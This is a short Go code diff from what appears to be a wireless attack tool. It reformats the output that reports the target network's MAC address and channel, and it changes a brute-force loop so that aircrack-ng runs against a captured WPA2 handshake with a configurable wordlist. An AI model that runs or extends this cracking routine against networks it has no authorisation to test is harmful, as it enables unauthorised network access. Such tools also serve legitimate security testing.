@@ -92,7 +92,10 @@ func getTargetInterfaceFromESSID(ESSID, netInterface string) (string, string) {
 		}
 	}
 
-	fmt.Printf("find mac address => %v channel => %v for ESSID => %v \n", macAddress, channel, ESSID)
+	fmt.Printf(`---------------
+find mac address => %v channel => %v for ESSID => %v
+---------------
+`, macAddress, channel, ESSID)
 
 	return macAddress, channel
 }
@@ -125,7 +128,8 @@ func runWPA2BruteForceInLoop() {
 	fmt.Println("trying to start brute force")
 	for {
 		fmt.Println("running brute force...")
-		stdout, stderr := execCmd("aircrack-ng hack-01.cap -w wordlist.txt")
+
+		stdout, stderr := execCmd(fmt.Sprintf("aircrack-ng hack-01.cap -w %v", WPA_WORDLIST))
 
 		if stderr != "" {
 			fmt.Println(stderr)
